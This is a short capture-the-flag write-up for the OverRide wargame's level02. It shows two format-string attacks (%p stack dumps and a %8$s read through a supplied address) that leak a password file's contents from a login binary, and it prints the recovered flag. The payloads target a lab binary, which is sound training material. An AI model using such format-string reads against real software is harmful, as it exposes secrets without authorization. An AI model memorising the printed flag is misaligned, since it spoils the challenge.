We can print the stack using printf so we can dump the buffer containing the contents of "/home/users/level3/.pass"

(python -c 'print "%22$p%23$p%24$p%25$p%26$p%27$p"') | ./level02

with a bit of cleanup we have this string

756e50523437684845414a3561733951377a7143574e6758354a35686e47587348336750664b394d

then accounted for endianess:

4868373452506e7551397361354a414558674e5743717a377358476e68354a354d394b6650673348


/************/
/* Method 2 */
/************/
If we print a bunch of addresses with the printf format (first prompt), we can actually read our second input. There we can write the address on the stack where "/home/users/level3/.pass" was written: 0x7fffffffe540.

level02@OverRide:~$ (python -c 'print "%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p\n" + "\x40\xe5\xff\xff\xff\x7f"') | ~/level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4d0 (nil) 0x40 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6c8 0x1f7ff9a08 0x7fffffffe540 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) does not have access!

Then we can kindly ask to printf to print the secret string on stdout:

level02@OverRide:~$ (python -c 'print "%8$s\n" + "\x40\xe5\xff\xff\xff\x7f"') | ~/level02 ===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H does not have access!

We have our flag printed in plain text!
